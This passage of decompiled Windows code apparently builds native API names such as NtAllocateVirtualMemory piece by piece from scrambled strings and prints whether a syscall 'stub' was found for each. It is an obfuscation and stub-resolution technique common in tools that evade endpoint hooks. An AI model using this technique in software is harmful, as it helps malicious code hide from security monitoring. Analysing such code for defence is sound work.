iVar5, L\"CThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e8a;\n    fcn.1400ba740(&stack0x00000c98 + iVar5, &stack0x00000cb8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ea7;\n    fcn.1400ba740(&stack0x00000c78 + iVar5, &stack0x00000c98 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ec4;\n    fcn.1400ba740(&stack0x00000c58 + iVar5, &stack0x00000c78 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ee1;\n    fcn.1400ba740(&stack0x00000c38 + iVar5, &stack0x00000c58 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004efe;\n    fcn.1400ba740(&stack0x00000c18 + iVar5, &stack0x00000c38 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004f1b;\n    fcn.1400ba740(&stack0x00000bf8 + iVar5, &stack0x00000c18 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004f38;\n    fcn.1400ba740(&stack0x00000bd8 + iVar5, &stack0x00000bf8 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004f55;\n    fcn.1400ba740(&stack0x00000bb8 + iVar5, &stack0x00000bd8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004f72;\n    fcn.1400ba740(&stack0x00000b98 + iVar5, &stack0x00000bb8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004f8f;\n    fcn.1400ba740(&stack0x00000b78 + iVar5, &stack0x00000b98 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004fac;\n    fcn.1400ba740(&stack0x00000b58 + iVar5, &stack0x00000b78 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004fc9;\n    fcn.1400ba740(&stack0x00000b38 + iVar5, &stack0x00000b58 + iVar5, L\"ExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004fe6;\n    fcn.1400ba740(&stack0x00000b18 + iVar5, &stack0x00000b38 + iVar5, L\"xRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ffc;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00000b18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000500b;\n    fcn.1400aa2e0(&stack0x00000b18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000501a;\n    fcn.1400aa2e0(&stack0x00000b38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005029;\n    fcn.1400aa2e0(&stack0x00000b58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005038;\n    fcn.1400aa2e0(&stack0x00000b78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005047;\n    fcn.1400aa2e0(&stack0x00000b98 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005056;\n    fcn.1400aa2e0(&stack0x00000bb8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005065;\n    fcn.1400aa2e0(&stack0x00000bd8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005074;\n    fcn.1400aa2e0(&stack0x00000bf8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005083;\n    fcn.1400aa2e0(&stack0x00000c18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005092;\n    fcn.1400aa2e0(&stack0x00000c38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050a1;\n    fcn.1400aa2e0(&stack0x00000c58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050b0;\n    fcn.1400aa2e0(&stack0x00000c78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050bf;\n    fcn.1400aa2e0(&stack0x00000c98 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050ce;\n    fcn.1400aa2e0(&stack0x00000cb8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050dd;\n    fcn.1400aa2e0(&stack0x00000cd8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050ec;\n    fcn.1400aa2e0(&stack0x00000cf8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400050fb;\n    fcn.140072290(&stack0x00000d27 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005111;\n    fcn.1400a9730(&stack0x00000d28 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00003008 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000514d;\n    uVar3 = fcn.1400015bd(&stack0x00000d28 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005162;\n    fcn.1400aa2e0(&stack0x00000d28 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000518a;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000519f;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400051ae;\n    fcn.140072260(&stack0x00000f17 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400051ce;\n    fcn.1400a9bc0(&stack0x00000ee8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00000f17 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400051eb;\n    fcn.1400ba740(&stack0x00000ec8 + iVar5, &stack0x00000ee8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005208;\n    fcn.1400ba740(&stack0x00000ea8 + iVar5, &stack0x00000ec8 + iVar5, L\"RsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005225;\n    fcn.1400ba740(&stack0x00000e88 + iVar5, &stack0x00000ea8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005242;\n    fcn.1400ba740(&stack0x00000e68 + iVar5, &stack0x00000e88 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000525f;\n    fcn.1400ba740(&stack0x00000e48 + iVar5, &stack0x00000e68 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000527c;\n    fcn.1400ba740(&stack0x00000e28 + iVar5, &stack0x00000e48 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005299;\n    fcn.1400ba740(&stack0x00000e08 + iVar5, &stack0x00000e28 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400052b6;\n    fcn.1400ba740(&stack0x00000de8 + iVar5, &stack0x00000e08 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400052d3;\n    fcn.1400ba740(&stack0x00000dc8 + iVar5, &stack0x00000de8 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400052f0;\n    fcn.1400ba740(&stack0x00000da8 + iVar5, &stack0x00000dc8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000530d;\n    fcn.1400ba740(&stack0x00000d88 + iVar5, &stack0x00000da8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000532a;\n    fcn.1400ba740(&stack0x00000d68 + iVar5, &stack0x00000d88 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005347;\n    fcn.1400ba740(&stack0x00000d48 + iVar5, &stack0x00000d68 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000535d;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00000d48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000536c;\n    fcn.1400aa2e0(&stack0x00000d48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000537b;\n    fcn.1400aa2e0(&stack0x00000d68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000538a;\n    fcn.1400aa2e0(&stack0x00000d88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005399;\n    fcn.1400aa2e0(&stack0x00000da8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053a8;\n    fcn.1400aa2e0(&stack0x00000dc8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053b7;\n    fcn.1400aa2e0(&stack0x00000de8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053c6;\n    fcn.1400aa2e0(&stack0x00000e08 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053d5;\n    fcn.1400aa2e0(&stack0x00000e28 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053e4;\n    fcn.1400aa2e0(&stack0x00000e48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400053f3;\n    fcn.1400aa2e0(&stack0x00000e68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005402;\n    fcn.1400aa2e0(&stack0x00000e88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005411;\n    fcn.1400aa2e0(&stack0x00000ea8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005420;\n    fcn.1400aa2e0(&stack0x00000ec8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000542f;\n    fcn.1400aa2e0(&stack0x00000ee8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000543e;\n    fcn.140072290(&stack0x00000f17 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005454;\n    fcn.1400a9730(&stack0x00000f18 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00003000 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005490;\n    uVar3 = fcn.1400015bd(&stack0x00000f18 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400054a5;\n    fcn.1400aa2e0(&stack0x00000f18 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400054cd;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400054e2;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400054f1;\n    fcn.140072260(&stack0x000011e7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005511;\n    fcn.1400a9bc0(&stack0x000011b8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x000011e7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000552e;\n    fcn.1400ba740(&stack0x00001198 + iVar5, &stack0x000011b8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000554b;\n    fcn.1400ba740(&stack0x00001178 + iVar5, &stack0x00001198 + iVar5, L\"WPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005568;\n    fcn.1400ba740(&stack0x00001158 + iVar5, &stack0x00001178 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005585;\n    fcn.1400ba740(&stack0x00001138 + iVar5, &stack0x00001158 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400055a2;\n    fcn.1400ba740(&stack0x00001118 + iVar5, &stack0x00001138 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400055bf;\n    fcn.1400ba740(&stack0x000010f8 + iVar5, &stack0x00001118 + iVar5, L\"FSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400055dc;\n    fcn.1400ba740(&stack0x000010d8 + iVar5, &stack0x000010f8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400055f9;\n    fcn.1400ba740(&stack0x000010b8 + iVar5, &stack0x000010d8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005616;\n    fcn.1400ba740(&stack0x00001098 + iVar5, &stack0x000010b8 + iVar5, L\"SngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005633;\n    fcn.1400ba740(&stack0x00001078 + iVar5, &stack0x00001098 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005650;\n    fcn.1400ba740(&stack0x00001058 + iVar5, &stack0x00001078 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000566d;\n    fcn.1400ba740(&stack0x00001038 + iVar5, &stack0x00001058 + iVar5, L\"gObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000568a;\n    fcn.1400ba740(&stack0x00001018 + iVar5, &stack0x00001038 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400056a7;\n    fcn.1400ba740(&stack0x00000ff8 + iVar5, &stack0x00001018 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400056c4;\n    fcn.1400ba740(&stack0x00000fd8 + iVar5, &stack0x00000ff8 + iVar5, L\"ObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400056e1;\n    fcn.1400ba740(&stack0x00000fb8 + iVar5, &stack0x00000fd8 + iVar5, L\"bjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400056fe;\n    fcn.1400ba740(&stack0x00000f98 + iVar5, &stack0x00000fb8 + iVar5, L\"jQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000571b;\n    fcn.1400ba740(&stack0x00000f78 + iVar5, &stack0x00000f98 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005738;\n    fcn.1400ba740(&stack0x00000f58 + iVar5, &stack0x00000f78 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005755;\n    fcn.1400ba740(&stack0x00000f38 + iVar5, &stack0x00000f58 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000576b;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00000f38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000577a;\n    fcn.1400aa2e0(&stack0x00000f38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005789;\n    fcn.1400aa2e0(&stack0x00000f58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005798;\n    fcn.1400aa2e0(&stack0x00000f78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057a7;\n    fcn.1400aa2e0(&stack0x00000f98 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057b6;\n    fcn.1400aa2e0(&stack0x00000fb8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057c5;\n    fcn.1400aa2e0(&stack0x00000fd8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057d4;\n    fcn.1400aa2e0(&stack0x00000ff8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057e3;\n    fcn.1400aa2e0(&stack0x00001018 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400057f2;\n    fcn.1400aa2e0(&stack0x00001038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005801;\n    fcn.1400aa2e0(&stack0x00001058 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005810;\n    fcn.1400aa2e0(&stack0x00001078 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000581f;\n    fcn.1400aa2e0(&stack0x00001098 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000582e;\n    fcn.1400aa2e0(&stack0x000010b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000583d;\n    fcn.1400aa2e0(&stack0x000010d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000584c;\n    fcn.1400aa2e0(&stack0x000010f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000585b;\n    fcn.1400aa2e0(&stack0x00001118 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000586a;\n    fcn.1400aa2e0(&stack0x00001138 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005879;\n    fcn.1400aa2e0(&stack0x00001158 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005888;\n    fcn.1400aa2e0(&stack0x00001178 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005897;\n    fcn.1400aa2e0(&stack0x00001198 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400058a6;\n    fcn.1400aa2e0(&stack0x000011b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400058b5;\n    fcn.140072290(&stack0x000011e7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400058cb;\n    fcn.1400a9730(&stack0x000011e8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002ff8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005907;\n    uVar3 = fcn.1400015bd(&stack0x000011e8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000591c;\n    fcn.1400aa2e0(&stack0x000011e8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005944;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005959;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005968;\n    fcn.140072260(&stack0x00001537 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005988;\n    fcn.1400a9bc0(&stack0x00001508 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00001537 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400059a5;\n    fcn.1400ba740(&stack0x000014e8 + iVar5, &stack0x00001508 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400059c2;\n    fcn.1400ba740(&stack0x000014c8 + iVar5, &stack0x000014e8 + iVar5, L\"QIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400059df;\n    fcn.1400ba740(&stack0x000014a8 + iVar5, &stack0x000014c8 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400059fc;\n    fcn.1400ba740(&stack0x00001488 + iVar5, &stack0x000014a8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005a19;\n    fcn.1400ba740(&stack0x00001468 + iVar5, &stack0x00001488 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005a36;\n    fcn.1400ba740(&stack0x00001448 + iVar5, &stack0x00001468 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005a53;\n    fcn.1400ba740(&stack0x00001428 + iVar5, &stack0x00001448 + iVar5, L\"IfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005a70;\n    fcn.1400ba740(&stack0x00001408 + iVar5, &stack0x00001428 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005a8d;\n    fcn.1400ba740(&stack0x000013e8 + iVar5, &stack0x00001408 + iVar5, L\"fpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005aaa;\n    fcn.1400ba740(&stack0x000013c8 + iVar5, &stack0x000013e8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ac7;\n    fcn.1400ba740(&stack0x000013a8 + iVar5, &stack0x000013c8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ae4;\n    fcn.1400ba740(&stack0x00001388 + iVar5, &stack0x000013a8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b01;\n    fcn.1400ba740(&stack0x00001368 + iVar5, &stack0x00001388 + iVar5, \n                  